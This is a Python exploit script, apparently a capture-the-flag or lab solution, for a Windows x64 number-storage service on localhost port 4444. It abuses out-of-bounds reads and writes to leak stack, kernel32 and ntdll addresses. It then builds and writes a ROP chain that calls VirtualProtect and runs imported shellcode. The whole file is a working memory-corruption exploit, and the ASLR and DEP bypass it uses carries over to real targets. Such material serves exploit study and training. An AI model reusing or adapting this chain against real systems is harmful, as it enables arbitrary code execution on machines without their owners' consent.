from util import *
from environment import *

s = Socket("127.0.0.1", 4444)

OFFSET_FAVORITES_TO_STACK_PUSHED_RBP = -0x18
OFFSET_RBP_TO_FAVORITES = 0x40

OFFSET_FAVORITES_TO_BASE_THREAD_INIT_THUNK_0x17 = 0x78
OFFSET_FAVORITES_TO_RET = 0x38

OFFSET_FAVORITES_TO_RTL_USER_THREAD_START_0x2c = 0xA8


def cmd():
    return s.recvuntil(b"cmd: ")


def send_n(n: int):
    s.send(f"{n}\r\n".encode("utf-8"))


def input_number(n: int):
    s.recvuntil(b"Input number (1-10): ")
    send_n(n)


def read_u32_by_offset(bytes_offset: int) -> int:
    assert bytes_offset % 4 == 0

    send_n(3)
    s.recvuntil(b"What number do you want to read? (You can choose 1 to 10) ")
    send_n(bytes_offset // 4 + 1)
    msg = s.recvline().decode("utf-8")
    num = int(msg.split("is")[1].strip())
    return u32(num)


def read_u64_by_offset(bytes_offset: int) -> int:
    lo = read_u32_by_offset(bytes_offset)
    cmd()
    hi = read_u32_by_offset(bytes_offset + 4)
    return (hi << 32) | lo


def write_u32_by_offset(bytes_offset: int, u32_value: int):
    assert bytes_offset % 4 == 0

    send_n(2)
    s.recvuntil(b"What number do you want to overwrite? (You can choose 1 to 10) ")
    send_n(bytes_offset // 4 + 1)

    i32_value = u32_value
    if i32_value >= 0x80000000:
        i32_value -= 0x100000000
    register_fav_number(i32_value)


def write_u64_by_offset(bytes_offset: int, u64_value: int):
    write_u32_by_offset(bytes_offset, u64_value & 0xFFFFFFFF)
    cmd()
    write_u32_by_offset(bytes_offset + 4, (u64_value >> 32) & 0xFFFFFFFF)


def register_fav_number(num: int):
    s.recvuntil(b"Input your favorite value: ")
    send_n(num)


def generate_payload(
    shell_code_address: int,
    virtualProtectStub_address: int,
    gadget_rcx: int,
    gadget_rdx_r11: int,
    gadget_r8: int,
    gadget_r9_r10_r11: int,
    old_protect_addr: int,
) -> bytes:
    payload = b""

    payload += le64(gadget_rcx)
    payload += le64(shell_code_address)
    payload += le64(gadget_rdx_r11)
    payload += le64(len(X64_SHELL_CODE))
    payload += le64(0)
    payload += le64(gadget_r8)
    payload += le64(0x40)
    payload += le64(gadget_r9_r10_r11)
    payload += le64(old_protect_addr)
    payload += le64(0)
    payload += le64(0)
    payload += le64(virtualProtectStub_address)
    payload += le64(shell_code_address)

    payload += X64_SHELL_CODE
    payload += b"B" * (4 - len(payload) % 4)

    return payload


def main():
    s.connect()
    cmd()

    # dummy write
    for _ in range(10):
        send_n(2)
        register_fav_number(1)
        cmd()

    rbp = read_u64_by_offset(OFFSET_FAVORITES_TO_STACK_PUSHED_RBP)
    print(f"rbp: 0x{rbp:x}")
    favorites_address = rbp - OFFSET_RBP_TO_FAVORITES
    print(f"favorites base: 0x{favorites_address:x}")

    cmd()
    ret = read_u64_by_offset(OFFSET_FAVORITES_TO_RET)
    print(f"ret: 0x{ret:x}")

    cmd()
    kernel32_BaseThreadInitThunk_address = (
        read_u64_by_offset(OFFSET_FAVORITES_TO_BASE_THREAD_INIT_THUNK_0x17) - 0x17
    )
    kernel32_address = (
        kernel32_BaseThreadInitThunk_address - X64_OFFSET_BaseThreadInitThunk
    )
    assert kernel32_address & 0xFFFF == 0

    kernel32_VirtualProtectStub_address = (
        kernel32_address + X64_OFFSET_VirtualProtectStub
    )
    print(f"kernel32!VirtualProtectStub = 0x{kernel32_VirtualProtectStub_address:x}")

    cmd()
    ntdll_RtlUserThreadStart = (
        read_u64_by_offset(OFFSET_FAVORITES_TO_RTL_USER_THREAD_START_0x2c) - 0x2C
    )
    ntdll_address = ntdll_RtlUserThreadStart - X64_OFFSET_RtlUserThreadStart
    assert ntdll_address & 0xFFFF == 0
    print(f"ntdll base = 0x{ntdll_address:x}")

    gadget_address_pop_rcx = ntdll_address + X64_OFFSET_GADGET_NTDLL_POP_RCX
    gadget_address_pop_rdx_pop_r11 = (
        ntdll_address + X64_OFFSET_GADGET_NTDLL_POP_RDX_POP_R11
    )
    gadget_address_pop_r8 = ntdll_address + X64_OFFSET_GADGET_NTDLL_POP_R8
    gadget_address_pop_r9_pop_r10_pop_r11 = (
        ntdll_address + X64_OFFSET_GADGET_NTDLL_POP_R9_POP_R10_POP_R11
    )

    rop_start = favorites_address + OFFSET_FAVORITES_TO_RET
    shell_code_address = rop_start + 13 * 8
    print(f"shell code address: 0x{shell_code_address:x}")

    payload = generate_payload(
        shell_code_address,
        kernel32_VirtualProtectStub_address,
        gadget_address_pop_rcx,
        gadget_address_pop_rdx_pop_r11,
        gadget_address_pop_r8,
        gadget_address_pop_r9_pop_r10_pop_r11,
        favorites_address,
    )
    print(f"payload size: {len(payload)}")

    for i in range(0, len(payload), 4):
        value = to_u32(payload, i)
        if value >= 0x80000000:
            value -= 0x100000000

        cmd()
        address = rop_start + i
        offset = address - favorites_address
        print(f"@0x{address:x}: 0x{value & 0xffffffff:x}")
        write_u32_by_offset(offset, value)


if __name__ == "__main__":
    main()
